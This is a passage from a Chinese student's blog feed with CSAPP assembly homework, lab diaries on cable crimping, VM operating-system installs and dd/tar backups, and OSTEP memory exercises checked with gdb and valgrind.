        <span class="token keyword">float</span> x <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>bits<span class="token punctuation">;</span>

        <span class="token class-name">range_t</span> expected <span class="token operator">=</span> <span class="token function">find_range</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">range_t</span> actual <span class="token operator">=</span> <span class="token function">find_range_stdlib</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>expected <span class="token operator">!=</span> actual<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"出现错误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"和参考函数完全一致"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>过了大概十几秒后输出：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auceptin_fang@Auceptin:~/CSAPP/chapter3$ ./3.74
和参考函数完全一致<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>没问题</p>
<h2 id="题目-3-75"><a href="#题目-3-75" class="headerlink" title="题目*3.75"></a>题目*3.75</h2><blockquote>
<p>ISO C99包括了支持复数的拓展。任何浮点数类型都可以用关键字complex修饰。这里有一些使用复数数据的示例函数，调用了一些关联的库函数<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;complex.h></span></span>

<span class="token keyword">double</span> <span class="token function">c_imag</span><span class="token punctuation">(</span><span class="token keyword">double</span> complex x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token function">cimag</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">double</span> <span class="token function">c_real</span><span class="token punctuation">(</span><span class="token keyword">double</span> complex x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token function">creal</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">double</span> complex <span class="token function">c_sub</span><span class="token punctuation">(</span><span class="token keyword">double</span> complex x<span class="token punctuation">,</span> <span class="token keyword">double</span> complex y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> x <span class="token operator">-</span> y<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>编译时，GCC为这些函数产生如下的代码：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">c_imag:
  movapd  %xmm1, %xmm0
  ret
c_real:
  rep; ret
c_sub:
  subsd   %xmm2, %xmm0
  subsd   %xmm3, %xmm1
  ret <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>根据这些例子，回答下列问题：<br>A.如何向函数传递复数参数？</p>
<p>B.如何从函数返回复数值</p>
</blockquote>
<p>复数分为实部(real)和虚部(imag)，分别加减。c_imag将xmm1移动到了xmm0，说明参数在xmm1，返回值在xmm0，而c_real直接返回，说明参数就在xmm0</p>
<p>再看c_sub，运算内容就是实部和虚部分别相减，于是推断偶数号浮点数寄存器存参数的实部，奇数存参数的虚部，而返回值是xmm0，xmm1</p>
<p>总结一下就是，传递参数，复数的实部通过偶数号寄存器传递、虚部通过奇数号寄存器传递；返回值，实部在xmm0，虚部在xmm1</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;题目-3-70&quot;&gt;&lt;a href=&quot;#题目-3-70&quot; class=&quot;headerlink&quot; title=&quot;题目***3.70&quot;&gt;&lt;/a&gt;题目***3.70&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;考虑下面的联合声明：&lt;br&gt;&lt;pre</summary>
        
      
    
    
    
    <category term="CSAPP" scheme="https://aucept.in/categories/CSAPP/"/>
    
    
    <category term="CSAPP" scheme="https://aucept.in/tags/CSAPP/"/>
    
    <category term="汇编" scheme="https://aucept.in/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>小学期实验日志Wed</title>
    <link href="https://aucept.in/2025/07/02/%E5%B0%8F%E5%AD%A6%E6%9C%9F%E6%97%A5%E5%BF%97Wed/"/>
    <id>https://aucept.in/2025/07/02/%E5%B0%8F%E5%AD%A6%E6%9C%9F%E6%97%A5%E5%BF%97Wed/</id>
    <published>2025-07-02T02:47:44.000Z</published>
    <updated>2025-07-03T02:20:23.040Z</updated>
    
    <content type="html"><![CDATA[<p>上午接网线，是格外需要注意细节的手工</p>
<p>当初学计网时还感慨接线顺序不会要背吧，实际被折磨一遍568B的顺序就不可能忘了——白橙 橙 白绿 蓝 白蓝 绿 白棕 棕</p>
<p>先把双绞线捋直，再按顺序排好，再塞进水晶头，压紧</p>
<p>坑点在于中间的十字支撑柱太碍事，线捋不直一塞进去就错位/塞不到顶，容易让人血压高，但也没啥值得说的了</p>
<p>下午拆装电脑</p>
<p>起初连显示器的线接错了位置导致显示器没反应</p>
<p>此外也没啥可说的了，该看不懂的硬件细节还是看不懂</p>
<p>anyway，写实验报告去了</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;上午接网线，是格外需要注意细节的手工&lt;/p&gt;
&lt;p&gt;当初学计网时还感慨接线顺序不会要背吧，实际被折磨一遍568B的顺序就不可能忘了——白橙 橙 白绿 蓝 白蓝 绿 白棕</summary>
        
      
    
    
    
    <category term="学习生活" scheme="https://aucept.in/categories/%E5%AD%A6%E4%B9%A0%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="实验" scheme="https://aucept.in/tags/%E5%AE%9E%E9%AA%8C/"/>
    
    <category term="接网线" scheme="https://aucept.in/tags/%E6%8E%A5%E7%BD%91%E7%BA%BF/"/>
    
  </entry>
  
  <entry>
    <title>小学期实验日志Mon</title>
    <link href="https://aucept.in/2025/06/30/%E5%B0%8F%E5%AD%A6%E6%9C%9F%E6%97%A5%E5%BF%97Mon/"/>
    <id>https://aucept.in/2025/06/30/%E5%B0%8F%E5%AD%A6%E6%9C%9F%E6%97%A5%E5%BF%97Mon/</id>
    <published>2025-06-30T11:12:01.000Z</published>
    <updated>2025-11-14T12:44:15.199Z</updated>
    
    <content type="html"><![CDATA[<p>实验内容大概是用U盘，在电脑的虚拟机上安装一个操作系统</p>
<h1 id="ROUND-1"><a href="#ROUND-1" class="headerlink" title="ROUND 1"></a>ROUND 1</h1><h2 id="制作U盘引导盘"><a href="#制作U盘引导盘" class="headerlink" title="制作U盘引导盘"></a>制作U盘引导盘</h2><p>第一步是下载U盘引导制作软件，选择<a href="https://www.dabaicai.com/">大白菜</a>了</p>
<p>1.4G，一百五十号人在一个教室里一起下载，带宽再大也不够用啊……去隔壁几分钟解决</p>
<p>按照引导完成</p>
<h2 id="下载系统文件"><a href="#下载系统文件" class="headerlink" title="下载系统文件"></a>下载系统文件</h2><p>起初想选择系统之家的，容易有捆绑软件，遂放弃</p>
<p>选择去学校提供的<a href="https://software.bupt.edu.cn/product.html?id=367">“正版软件下载”网址</a>，进去一看ssl证书过期了，难绷</p>
<p>得到一个.iso文件，ppt里并没有直接说iso文件怎么处理</p>
<p>听gpt老师的，去<a href="https://rufus.ie/en/">rufus官网</a>下载rufus，运行后选择刚下载的iso文件，其余保持默认，点击开始</p>
<p>这一步格式化了U盘，然后变成了一个可引导安装盘……重做了一遍第一步，大白菜也是可以的</p>
<p><del>然后把.iso文件拷贝进去</del></p>
<h2 id="windows电脑上安装vm-ware"><a href="#windows电脑上安装vm-ware" class="headerlink" title="windows电脑上安装vm ware"></a>windows电脑上安装vm ware</h2><p><a href="https://www.techspot.com/downloads/189-vmware-workstation-for-windows.html">网址</a>，是正版吗？姑且相信edge吧</p>
<p>vmware，一个虚拟机管理软件</p>
<p>创建新的虚拟机-&gt;典型-&gt;浏览目录选择U盘里的.iso文件-&gt;选择操作系统-&gt;默认配置-&gt;设置密码-&gt;默认配置</p>
<p>进入了boot maintenance manager，默认选项下一步，进入win11安装程序，按照引导进行即可</p>
<p><del>安装很慢，学ostep去了</del></p>
<p><del>感觉一个小时都不止</del></p>
<p><img src="/image/log1_oswin11.png" alt="p0"></p>
<p>OK完成</p>
<h2 id="分盘"><a href="#分盘" class="headerlink" title="分盘"></a>分盘</h2><p>win+X进入磁盘管理</p>
<p>C盘压缩卷，然后输入一部分空间得到一块未分配区域，然后新定义一块盘<br><img src="/image/log0_disk.png" alt="p1"></p>
<h1 id="ROUND-2"><a href="#ROUND-2" class="headerlink" title="ROUND 2"></a>ROUND 2</h1><p>某些环节讨巧了，再来一次，这次换linux，选的arch</p>
<p>看着docker run -it archlinux和wsl —install archlinux陷入沉思，装windows绕个圈子还有些道理，linux显得好傻</p>
<h2 id="重新下载系统"><a href="#重新下载系统" class="headerlink" title="重新下载系统"></a>重新下载系统</h2><p><a href="https://mirrors.aliyun.com/archlinux/iso/2025.06.01/">archlinux网址</a>，然后重新烧录一遍U盘</p>
<h2 id="重新安装系统"><a href="#重新安装系统" class="headerlink" title="重新安装系统"></a>重新安装系统</h2><p>VMware -&gt; 新建虚拟机 -&gt; 自定义 -&gt; 稍后安装 -&gt; 选择os版本-&gt;默认配置-&gt;完成创建</p>
<p>开启虚拟机前把U盘作为一块硬盘加进新建的虚拟机里：</p>
<p>虚拟机设置-&gt;增加-&gt;硬盘-&gt;选择物理硬盘-&gt;去查一下U盘在本机的disk编号-&gt;物理驱动1-&gt;整盘-&gt;完成</p>
<p>然后进入虚拟机，没找到进入boot页面的快捷键，搜.vmx文件，补充一行 bios.forceSetupOnce = “TRUE”，再进入就默认boot了</p>
<p>找到boot选项，有四个引导选项，选硬盘驱动hard drive，在子项里找vm ware虚拟……2，在设置里可以看到我的U盘被映射到了2号</p>
<p>+提升优先级到最顶上，然后f10保存，退出，os开始安装了</p>
<p><img src="/image/log2_arch.png" alt="log2"></p>
<h2 id="系统备份与系统修复"><a href="#系统备份与系统修复" class="headerlink" title="系统备份与系统修复"></a>系统备份与系统修复</h2><p>备份有不同的压缩方式，由于课件上没看懂用的什么，选择不压缩</p>
<p>没有了图形化界面，接下来就靠指令完成了：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>/dev/sda <span class="token assign-left variable">of</span><span class="token operator">=</span>/mnt/backup/arch_full_backup.img <span class="token assign-left variable">bs</span><span class="token operator">=</span>1M <span class="token assign-left variable">status</span><span class="token operator">=</span>progress<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>含义是不压缩地（dd）把/dev/sda下的所有输出到/mnt/backup/arch_full_backup.img，每次1M，显示进度</p>
<p>出现权限问题，chomd未解决，换压缩备份</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-czpf</span> arch-rootfs.tar.gz <span class="token punctuation">\</span>
  <span class="token parameter variable">--exclude</span><span class="token operator">=</span>/proc <span class="token punctuation">\</span>
  <span class="token parameter variable">--exclude</span><span class="token operator">=</span>/sys <span class="token punctuation">\</span>
  <span class="token parameter variable">--exclude</span><span class="token operator">=</span>/dev <span class="token punctuation">\</span>
  <span class="token parameter variable">--exclude</span><span class="token operator">=</span>/tmp <span class="token punctuation">\</span>
  <span class="token parameter variable">--exclude</span><span class="token operator">=</span>/run <span class="token punctuation">\</span>
  <span class="token parameter variable">--exclude</span><span class="token operator">=</span>/mnt <span class="token punctuation">\</span>
  <span class="token parameter variable">--exclude</span><span class="token operator">=</span>/media <span class="token punctuation">\</span>
  <span class="token parameter variable">--exclude</span><span class="token operator">=</span>/lost+found <span class="token punctuation">\</span>
  /<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行后ls可以看到arch-rootfs.tar.gz文件，备份完成，可以存到U盘里</p>
<p>至于复原，确定一个根目录，复制备份文件，解压，略</p>
<p>第一天实验结束。</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;实验内容大概是用U盘，在电脑的虚拟机上安装一个操作系统&lt;/p&gt;
&lt;h1 id=&quot;ROUND-1&quot;&gt;&lt;a href=&quot;#ROUND-1&quot; class=&quot;headerlink&quot; title=&quot;ROUND 1&quot;&gt;&lt;/a&gt;ROUND 1&lt;/h1&gt;&lt;h2</summary>
        
      
    
    
    
    <category term="学习生活" scheme="https://aucept.in/categories/%E5%AD%A6%E4%B9%A0%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="操作系统" scheme="https://aucept.in/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="实验" scheme="https://aucept.in/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP-第十四章</title>
    <link href="https://aucept.in/2025/06/29/OSTEP-%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0/"/>
    <id>https://aucept.in/2025/06/29/OSTEP-%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0/</id>
    <published>2025-06-29T09:47:12.000Z</published>
    <updated>2025-06-29T09:49:11.277Z</updated>
    
    <content type="html"><![CDATA[<h2 id="14-1"><a href="#14-1" class="headerlink" title="14.1"></a>14.1</h2><blockquote>
<p>首先，编写一个名为null.c的简单程序，它创建一个指向整数的指针，将其设置为NULL，然后尝试对其进行释放内存操作。把它编译成一个名为null的可执行文件。当你运行这个程序时会发生什么?</p>
</blockquote>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>null <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc null.c <span class="token parameter variable">-o</span> null
./null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>什么也没发生</p>
<p>如果是用clion自带的构建输出，倒是会提示：cannot open output file null.exe: Invalid argument</p>
<h2 id="14-2"><a href="#14-2" class="headerlink" title="14.2"></a>14.2</h2><blockquote>
<p>接下来，编译该程序，其中包含符号信息(使用-g标志)。这样做可以将更多信息放入可执行文件中,使调试器可以访问有关变量名称等的更多有用信息。通过输入 gdb null,在调试器下运行该程序，然后，一旦 gdb运行，输入run。gdb显示什么信息?<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc null.c <span class="token parameter variable">-o</span> null <span class="token parameter variable">-g</span>
gdb null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>结果是：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> run
Starting program: /home/auceptin_fang/OSTEP/chapter14/null
<span class="token punctuation">[</span>Thread debugging using libthread_db enabled<span class="token punctuation">]</span>
Using <span class="token function">host</span> libthread_db library <span class="token string">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="token builtin class-name">.</span>
<span class="token punctuation">[</span>Inferior <span class="token number">1</span> <span class="token punctuation">(</span>process <span class="token number">100232</span><span class="token punctuation">)</span> exited normally<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
</blockquote>
<p>这对吗</p>
<h2 id="14-3"><a href="#14-3" class="headerlink" title="14.3"></a>14.3</h2><blockquote>
<p>最后，对这个程序使用 valgrind 工具。我们将使用属于 valgrind 的 memcheck 工具来分析发生的情况。输入以下命令来运行程序:valgrind —leak-check=yes null。当你运行它时会发生什么?你能解释工具的输出吗?</p>
</blockquote>
<p>valgrind我已经安装好了<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">valgrind --leak-check<span class="token operator">=</span>yes ./null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>得到输出：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">==</span><span class="token number">103761</span><span class="token operator">==</span> Memcheck, a memory error detector
<span class="token operator">==</span><span class="token number">103761</span><span class="token operator">==</span> Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2002</span>-2022, and GNU GPL'd, by Julian Seward et al.
<span class="token operator">==</span><span class="token number">103761</span><span class="token operator">==</span> Using Valgrind-3.22.0 and LibVEX<span class="token punctuation">;</span> rerun with <span class="token parameter variable">-h</span> <span class="token keyword">for</span> copyright info
<span class="token operator">==</span><span class="token number">103761</span><span class="token operator">==</span> Command: ./null
<span class="token operator">==</span><span class="token number">103761</span><span class="token operator">==</span>
<span class="token operator">==</span><span class="token number">103761</span><span class="token operator">==</span> 
<span class="token operator">==</span><span class="token number">103761</span><span class="token operator">==</span> HEAP SUMMARY:
<span class="token operator">==</span><span class="token number">103761</span><span class="token operator">==</span>     <span class="token keyword">in</span> use at exit: <span class="token number">0</span> bytes <span class="token keyword">in</span> <span class="token number">0</span> blocks
<span class="token operator">==</span><span class="token number">103761</span><span class="token operator">==</span>   total heap usage: <span class="token number">0</span> allocs, <span class="token number">0</span> frees, <span class="token number">0</span> bytes allocated
<span class="token operator">==</span><span class="token number">103761</span><span class="token operator">==</span>
<span class="token operator">==</span><span class="token number">103761</span><span class="token operator">==</span> All heap blocks were freed -- no leaks are possible
<span class="token operator">==</span><span class="token number">103761</span><span class="token operator">==</span>
<span class="token operator">==</span><span class="token number">103761</span><span class="token operator">==</span> For lists of detected and suppressed errors, rerun with: <span class="token parameter variable">-s</span>
<span class="token operator">==</span><span class="token number">103761</span><span class="token operator">==</span> ERROR SUMMARY: <span class="token number">0</span> errors from <span class="token number">0</span> contexts <span class="token punctuation">(</span>suppressed: <span class="token number">0</span> from <span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>啊这，没有问题。在跟claude4交流之后我确认，free(null) = free (NULL)，而这个操作在c里面是安全的，所以以上实验结果没有问题</p>
<h2 id="14-4"><a href="#14-4" class="headerlink" title="14.4"></a>14.4</h2><blockquote>
<p>4.编写一个使用 malloc()来分配内存的简单程序，但在退出之前忘记释放它。这个程序运行时会发生什么?你可以用gdb来查找它的任何问题吗?用vagrind 呢(再次使用<br>—leak-check=yes标志)?</p>
</blockquote>
<p>会发生什么吗？操作系统在进程退出后帮我释放掉<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>运行一下，没有任何输出，gdb下运行，和刚才基本一致<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">valgrind --leak-check<span class="token operator">=</span>yes ./14.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span> HEAP SUMMARY:
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span>     <span class="token keyword">in</span> use at exit: <span class="token number">4</span> bytes <span class="token keyword">in</span> <span class="token number">1</span> blocks
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span>   total heap usage: <span class="token number">1</span> allocs, <span class="token number">0</span> frees, <span class="token number">4</span> bytes allocated
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span>
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span> <span class="token number">4</span> bytes <span class="token keyword">in</span> <span class="token number">1</span> blocks are definitely lost <span class="token keyword">in</span> loss record <span class="token number">1</span> of <span class="token number">1</span>
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span>    at 0x4846828: malloc <span class="token punctuation">(</span>in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span>    by 0x10915E: main <span class="token punctuation">(</span>in /home/auceptin_fang/OSTEP/chapter14/14.4<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span>
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span> LEAK SUMMARY:
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span>    definitely lost: <span class="token number">4</span> bytes <span class="token keyword">in</span> <span class="token number">1</span> blocks
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span>    indirectly lost: <span class="token number">0</span> bytes <span class="token keyword">in</span> <span class="token number">0</span> blocks
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span>      possibly lost: <span class="token number">0</span> bytes <span class="token keyword">in</span> <span class="token number">0</span> blocks
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span>    still reachable: <span class="token number">0</span> bytes <span class="token keyword">in</span> <span class="token number">0</span> blocks
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span>         suppressed: <span class="token number">0</span> bytes <span class="token keyword">in</span> <span class="token number">0</span> blocks
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span>
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span> For lists of detected and suppressed errors, rerun with: <span class="token parameter variable">-s</span>
<span class="token operator">==</span><span class="token number">110749</span><span class="token operator">==</span> ERROR SUMMARY: <span class="token number">1</span> errors from <span class="token number">1</span> contexts <span class="token punctuation">(</span>suppressed: <span class="token number">0</span> from <span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>看到它检测到堆上allocs了一次，4字节，free了0次，检测到了一个错误</p>
<h2 id="14-5"><a href="#14-5" class="headerlink" title="14.5"></a>14.5</h2><blockquote>
<p>编写一个程序，使用 malloc 创建一个名为 data、大小为100的整数数组。然后，将data[100]设置为0。当你运行这个程序时会发生什么?当你使用 valgrind 运行这个程序时会发生什么?程序是否正确?</p>
</blockquote>
<p><del>我们lua程序员就没有这个事</del></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token number">100</span><span class="token punctuation">[</span>data<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>不要在意其中某个好玩的细节</p>
<p>直接运行，没有输出没有报错。用valgrind：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span> Invalid <span class="token function">write</span> of size <span class="token number">4</span>
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>    at 0x10916D: main <span class="token punctuation">(</span>in /home/auceptin_fang/OSTEP/chapter14/14.5<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>  Address 0x4a771d0 is <span class="token number">0</span> bytes after a block of size <span class="token number">400</span> alloc'd
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>    at 0x4846828: malloc <span class="token punctuation">(</span>in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>    by 0x10915E: main <span class="token punctuation">(</span>in /home/auceptin_fang/OSTEP/chapter14/14.5<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span> HEAP SUMMARY:
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>     <span class="token keyword">in</span> use at exit: <span class="token number">400</span> bytes <span class="token keyword">in</span> <span class="token number">1</span> blocks
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>   total heap usage: <span class="token number">1</span> allocs, <span class="token number">0</span> frees, <span class="token number">400</span> bytes allocated
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span> LEAK SUMMARY:
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>    definitely lost: <span class="token number">400</span> bytes <span class="token keyword">in</span> <span class="token number">1</span> blocks
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>    indirectly lost: <span class="token number">0</span> bytes <span class="token keyword">in</span> <span class="token number">0</span> blocks
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>      possibly lost: <span class="token number">0</span> bytes <span class="token keyword">in</span> <span class="token number">0</span> blocks
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>    still reachable: <span class="token number">0</span> bytes <span class="token keyword">in</span> <span class="token number">0</span> blocks
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>         suppressed: <span class="token number">0</span> bytes <span class="token keyword">in</span> <span class="token number">0</span> blocks
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span> Rerun with --leak-check<span class="token operator">=</span>full to see details of leaked memory
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span>
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span> For lists of detected and suppressed errors, rerun with: <span class="token parameter variable">-s</span>
<span class="token operator">==</span><span class="token number">117106</span><span class="token operator">==</span> ERROR SUMMARY: <span class="token number">1</span> errors from <span class="token number">1</span> contexts <span class="token punctuation">(</span>suppressed: <span class="token number">0</span> from <span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>有报错了，Invalid write of size 4，也就是说有四字节的写入是Invalid的</p>
